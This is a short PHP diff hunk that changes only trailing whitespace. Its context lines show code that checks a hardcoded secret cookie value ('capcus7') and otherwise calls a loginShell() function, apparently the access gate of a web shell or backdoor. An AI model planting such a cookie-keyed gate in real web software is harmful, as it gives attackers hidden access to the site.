@@ -10,7 +10,7 @@ if (isset($_COOKIE['cicak']) && $_COOKIE['cus'] === 'capcus7') {
     } else {
         loginShell();
     }
-}
+} 
 
 function loginShell()
 {
